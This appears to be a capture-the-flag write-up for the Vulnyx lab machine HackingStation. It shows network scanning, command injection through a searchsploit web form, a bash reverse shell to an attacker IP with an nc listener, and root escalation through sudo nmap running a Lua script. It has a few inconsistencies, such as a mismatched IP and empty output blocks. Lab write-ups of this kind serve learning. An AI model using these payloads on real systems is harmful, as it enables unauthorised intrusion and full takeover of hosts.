# üñ•Ô∏è Writeup - HackingStation 

**Platform:** Vulnyx  
**Operating System:** Linux  

# INSTALLATION

We download the `zip` containing the `.ova` of the HackingStation machine, extract it, and import it into VirtualBox.

We configure the network interface of the HackingStation machine and run it alongside the attacker machine.

# HOST DISCOVERY

At this point, we still don‚Äôt know which `IP` address is assigned to HackingStation, so we discover it as follows:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```
Info:
```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts

 10.0.4.23       08:00:27:7f:d5:63      1      60  PCS Systemtechnik GmbH
 ```

 We identify with high confidence that the victim‚Äôs IP is `10.0.4.21`.

 # PORT SCANNING

Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.23
``` 

```bash
nmap -n -Pn -sCV -p80 --min-rate 5000 10.0.4.23
```

```

We only have port `80` open.

We access the service over `HTTP` and find a page that allows us to search for exploits by entering a keyword.

It looks likely that when we submit a word the server runs the command `searchsploit <input>`.

The first thing that occurred to me when I saw this was to use a semicolon to chain and execute other commands such as `whoami`. We try `hola; id`:

![alt text](../images/id.png)

At the very bottom we see the output of the id command.

```
uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)
```

We are executing commands as the user hacker.

We will abuse this vulnerability to inject a command that returns a `reverse shell`. To make manipulation easier we intercept the request with `Burp Suite`.

![alt text](../images/request.png)

Now we inject, instead of the `id` command, the command that spawns the `reverse shell` (the command is as follows):

```bash
bash -c 'bash -i >& /dev/tcp/10.0.4.12/4444 0>&1'
```

Once we have it, we press `Ctrl + U` to apply `URL encoding`, resulting in the encoded payload.

![alt text](../images/request2.png)

Before forwarding the request we set up a `listener` on our attacker machine.

```bash
sudo nc -nlvp 4444
```

Then we forward the request, and we receive the `reverse shell` as user `hacker`.

Info:
```

```

In `/home/hacker` we find the `user flag`.

# TTY

Before attempting privilege escalation, we upgrade the `TTY` for a more interactive shell:

```bash
script /dev/null -c bash
```
`ctrl Z`
```bash
stty raw -echo; fg
```
```bash
reset xterm
```
```bash
export TERM=xterm
```
```bash
export BASH=bash
```

# PRIVILEGE ESCALATION

Comprobamos permisos `sudo` y `SUID`.

```bash
sudo -l
```

Info:
```
Matching Defaults entries for hacker on HackingStation:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User hacker may run the following commands on HackingStation:
    (root) NOPASSWD: /usr/bin/nmap
```

We discover that the `nmap` binary is executable with `root` privileges. We can leverage this to escalate privileges as follows:

```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```
